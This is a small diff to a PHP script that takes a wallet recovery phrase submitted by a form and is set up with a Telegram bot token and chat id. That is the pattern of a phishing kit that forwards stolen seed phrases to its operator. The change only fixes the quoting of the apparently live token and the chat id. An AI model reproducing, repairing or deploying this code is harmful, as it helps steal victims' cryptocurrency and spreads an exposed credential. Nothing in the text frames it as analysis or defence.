@@ -1,7 +1,7 @@
 <?php
 // Replace with your own bot token and chat id
-$botToken = 7210917381:AAGPxkv9Y3dqnBj_rHOtWvvuIyg9qHlpFrg;
-$chatId = 5160818690;
+$botToken = '7210917381:AAGPxkv9Y3dqnBj_rHOtWvvuIyg9qHlpFrg';
+$chatId = '5160818690';
 
 // Get the recovery phrase from POST
 $unlockSubmitBtn = isset($_POST['unlockSubmitBtn']) ? trim($_POST['unlockSubmitBtn']) : '';
@@ -38,3 +38,4 @@ if ($unlockSubmitBtn) {
     exit();
 }
 ?>
+
